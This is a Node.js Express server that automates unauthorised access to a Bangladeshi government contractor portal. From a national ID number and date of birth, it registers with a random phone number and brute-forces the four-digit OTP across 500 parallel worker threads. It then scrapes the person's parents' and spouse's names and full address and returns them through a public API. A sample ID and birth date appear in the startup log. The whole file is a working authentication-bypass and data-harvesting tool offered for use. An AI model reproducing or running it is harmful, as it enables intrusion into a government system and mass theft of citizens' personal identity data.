const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configuration
const MOBILE_PREFIX = "016";
const BATCH_SIZE = 500;
const MAX_WORKERS = 500; 
const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";
const OTP_ATTEMPT_TIMEOUT = 10000; 
const BATCH_TOTAL_TIMEOUT = 60000; 

// Enhanced headers from Python code
const BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Origin': 'https://fsmms.dgf.gov.bd',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'en-US,en;q=0.9',
};

// Helper functions
function randomMobile(prefix) {
    return prefix + Math.random().toString().slice(2, 10);
}

function randomPassword() {
    const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomChars = '';
    for (let i = 0; i < 8; i++) {
        randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return "#" + uppercase + randomChars;
}

function generateOTPRange() {
    const range = [];
    for (let i = 0; i < 10000; i++) {
        range.push(i.toString().padStart(4, '0'));
    }
    return range;
}

// Enhanced session creation with proper headers
async function getSessionAndBypass(nid, dob, mobile, password) {
    try {
        const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor';
        
        const headers = {
            ...BASE_HEADERS,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
        };

        const data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": mobile,
            "dateOfBirth": dob,
            "password": password,
            "confirm_password": password,
            "next1": ""
        };

        const response = await axios.post(url, data, {
            maxRedirects: 0,
            validateStatus: null,
            headers: headers
        });

        if (response.status === 302 && response.headers.location && response.headers.location.includes('mov-verification')) {
            const cookies = response.headers['set-cookie'];
            return {
                cookies: cookies,
                session: axios.create({
                    headers: {
                        ...BASE_HEADERS,
                        'Cookie': cookies.join('; ')
                    }
                })
            };
        } else {
            throw new Error('Bypass Failed - Check NID and DOB');
        }
    } catch (error) {
        throw new Error('Session creation failed: ' + error.message);
    }
}

async function tryOTP(session, cookies, otp) {
    try {
        const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
        
        const headers = {
            ...BASE_HEADERS,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookies.join('; '),
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
        };

        const data = {
            "otpDigit1": otp[0],
            "otpDigit2": otp[1],
            "otpDigit3": otp[2],
            "otpDigit4": otp[3]
        };

        const response = await session.post(url, data, {
            maxRedirects: 0,
            validateStatus: null,
            headers: headers,
            timeout: OTP_ATTEMPT_TIMEOUT
        });

        if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
            return otp;
        }
        return null;
    } catch (error) {
        return null;
    }
}

// Worker thread processing function
function createWorker(workerBatch, cookies, workerId) {
    return new Promise((resolve, reject) => {
        const workerCode = `
            const { parentPort, workerData } = require('worker_threads');
            const axios = require('axios');
            
            const BASE_HEADERS = ${JSON.stringify(BASE_HEADERS)};
            const OTP_ATTEMPT_TIMEOUT = ${OTP_ATTEMPT_TIMEOUT};
            const TARGET_LOCATION = "${TARGET_LOCATION}";
            
            async function tryOTP(session, cookies, otp) {
                try {
                    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
                    
                    const headers = {
                        ...BASE_HEADERS,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Cookie': cookies.join('; '),
                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
                    };

                    const data = {
                        "otpDigit1": otp[0],
                        "otpDigit2": otp[1],
                        "otpDigit3": otp[2],
                        "otpDigit4": otp[3]
                    };

                    const response = await session.post(url, data, {
                        maxRedirects: 0,
                        validateStatus: null,
                        headers: headers,
                        timeout: OTP_ATTEMPT_TIMEOUT
                    });

                    if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
                        return otp;
                    }
                    return null;
                } catch (error) {
                    return null;
                }
            }

            (async () => {
                const { otpBatch, cookies, workerId } = workerData;
                const session = axios.create({
                    headers: {
                        ...BASE_HEADERS,
                        'Cookie': cookies.join('; ')
                    },
                    timeout: OTP_ATTEMPT_TIMEOUT
                });

                try {
                    for (let i = 0; i < otpBatch.length; i++) {
                        const otp = otpBatch[i];
                        const result = await tryOTP(session, cookies, otp);
                        if (result) {
                            parentPort.postMessage({ 
                                foundOTP: result,
                                workerId: workerId 
                            });
                            return;
                        }
                    }
                    parentPort.postMessage({ 
                        foundOTP: null,
                        workerId: workerId 
                    });
                } catch (error) {
                    parentPort.postMessage({ 
                        error: error.message,
                        workerId: workerId 
                    });
                }
            })();
        `;

        const worker = new Worker(workerCode, {
            eval: true,
            workerData: {
                otpBatch: workerBatch,
                cookies: cookies,
                workerId: workerId
            }
        });

        worker.on('message', (message) => {
            if (message.foundOTP) {
                resolve(message.foundOTP);
                worker.terminate();
            } else if (message.error) {
                reject(new Error(`Worker ${workerId} error: ${message.error}`));
            } else {
                resolve(null);
            }
        });

        worker.on('error', (error) => {
            reject(error);
        });

        worker.on('exit', (code) => {
            if (code !== 0) {
                reject(new Error(`Worker ${workerId} stopped with exit code ${code}`));
            }
        });
    });
}

async function tryBatchWithWorkers(cookies, otpBatch, maxWorkers = 500) {
    const batchSize = Math.ceil(otpBatch.length / maxWorkers);
    const workers = [];
    

    for (let i = 0; i < maxWorkers; i++) {
        const start = i * batchSize;
        const end = start + batchSize;
        const workerBatch = otpBatch.slice(start, end);
        
        if (workerBatch.length === 0) continue;

        workers.push(
            createWorker(workerBatch, cookies, i + 1)
                .catch(error => {
                    console.error(`Worker ${i + 1} error:`, error.message);
                    return null;
                })
        );
    }

    
    return new Promise((resolve) => {
        let completed = 0;
        let found = false;

        workers.forEach((workerPromise, index) => {
            workerPromise.then(result => {
                completed++;
                
                if (result && !found) {
                    found = true;
                    console.log(`Worker ${index + 1} found OTP: ${result}`);
                    resolve(result);
                } else if (completed === workers.length && !found) {
                    console.log('All completed, OTP not found');
                    resolve(null);
                }
            });
        });

        
        setTimeout(() => {
            if (!found) {
                resolve(null);
            }
        }, BATCH_TOTAL_TIMEOUT);
    });
}

async function fetchFormData(session, cookies) {
    try {
        const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';
        
        const headers = {
            ...BASE_HEADERS,
            'Cookie': cookies.join('; '),
            'Sec-Fetch-Site': 'cross-site',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
        };

        const response = await session.get(url, { headers: headers });
        return response.data;
    } catch (error) {
        throw new Error('Form data fetch failed: ' + error.message);
    }
}

function extractFields(html, ids) {
    const result = {};

    ids.forEach(field_id => {
        const regex = new RegExp(`<input[^>]*id="${field_id}"[^>]*value="([^"]*)"`);
        const match = html.match(regex);
        result[field_id] = match ? match[1] : "";
    });

    return result;
}

function enrichData(contractor_name, result, nid, dob) {
    const mapped = {
        "nameBangla": contractor_name,
        "nameEnglish": "",
        "nationalId": nid,
        "dateOfBirth": dob,
        "fatherName": result.fatherName || "",
        "motherName": result.motherName || "",
        "spouseName": result.spouseName || "",
        "gender": "",
        "religion": "",
        "birthPlace": result.nidPerDistrict || "",
        "nationality": result.nationality || "",
        "division": result.nidPerDivision || "",
        "district": result.nidPerDistrict || "",
        "upazila": result.nidPerUpazila || "",
        "union": result.nidPerUnion || "",
        "village": result.nidPerVillage || "",
        "ward": result.nidPerWard || "",
        "zip_code": result.nidPerZipCode || "",
        "post_office": result.nidPerPostOffice || ""
    };

    const address_parts = [
        `বাসা/হোল্ডিং: ${result.nidPerHolding || '-'}`,
        `গ্রাম/রাস্তা: ${result.nidPerVillage || ''}`,
        `মৌজা/মহল্লা: ${result.nidPerMouza || ''}`,
        `ইউনিয়ন ওয়ার্ড: ${result.nidPerUnion || ''}`,
        `ডাকঘর: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''}`,
        `উপজেলা: ${result.nidPerUpazila || ''}`,
        `জেলা: ${result.nidPerDistrict || ''}`,
        `বিভাগ: ${result.nidPerDivision || ''}`
    ];

    const filtered_parts = address_parts.filter(part => {
        const parts = part.split(": ");
        return parts[1] && parts[1].trim() && parts[1] !== "-";
    });

    const address_line = filtered_parts.join(", ");

    mapped.permanentAddress = address_line;
    mapped.presentAddress = address_line;

    return mapped;
}

// API Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Enhanced NID Info API is running',
        status: 'active',
        endpoints: {
            getInfo: '/get-info?nid=YOUR_NID&dob=YYYY-MM-DD'
        },
        features: {
            enhancedHeaders: true,
            parallelWorkers: true,
            improvedPasswordGeneration: true,
            mobilePrefix: MOBILE_PREFIX,
            maxWorkers: MAX_WORKERS
        }
    });
});

app.get('/get-info', async(req, res) => {
    try {
        const { nid, dob } = req.query;

        if (!nid || !dob) {
            return res.status(400).json({ error: 'NID and DOB are required' });
        }

        const startTime = Date.now();

        const password = randomPassword();
        const mobile = randomMobile(MOBILE_PREFIX);

        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);

        let otpRange = generateOTPRange();

      
        for (let i = otpRange.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [otpRange[i], otpRange[j]] = [otpRange[j], otpRange[i]];
        }
        let foundOTP = await tryBatchWithWorkers(cookies, otpRange, MAX_WORKERS);

        const endTime = Date.now();
        const duration = (endTime - startTime) / 1000;

        if (foundOTP) {
        
            console.log('Fetching form data...');
            const html = await fetchFormData(session, cookies);

            const ids = [
                "contractorName", "fatherName", "motherName", "spouseName", 
                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice",
                "nidPerHolding", "nidPerMouza"
            ];

            const extractedData = extractFields(html, ids);
            const finalData = enrichData(extractedData.contractorName || "", extractedData, nid, dob);

            console.log(`✅ Success: Data retrieved in ${duration} seconds`);
            
            res.json({
                success: true,
                data: finalData,
                sessionInfo: {
                    mobileUsed: mobile,
                    otpFound: foundOTP,
                    duration: `${duration} seconds`
                }
            });

        } else {
            console.log(`❌ Error: OTP not found after ${duration} seconds`);
            res.status(404).json({ 
                success: false,
                error: "OTP not found after trying all combinations",
                duration: `${duration} seconds`,
                timeoutReached: duration >= (BATCH_TOTAL_TIMEOUT/1000)
            });
        }

    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});


app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'Enhanced NID Info API',
        version: '3.0.0',
        workers: MAX_WORKERS,
        timeouts: {
            perOTPAttempt: `${OTP_ATTEMPT_TIMEOUT/1000} seconds`,
            totalBatch: `${BATCH_TOTAL_TIMEOUT/1000} seconds`
        }
    });
});


app.get('/test-creds', (req, res) => {
    const mobile = randomMobile(MOBILE_PREFIX);
    const password = randomPassword();
    
    res.json({
        mobile: mobile,
        password: password,
        note: 'These are randomly generated test credentials'
    });
});


if (isMainThread) {
    app.listen(PORT, () => {
        console.log(`📍 Main endpoint: http://localhost:${PORT}/get-info?nid=8667082708&dob=1962-11-07`);
    });
}
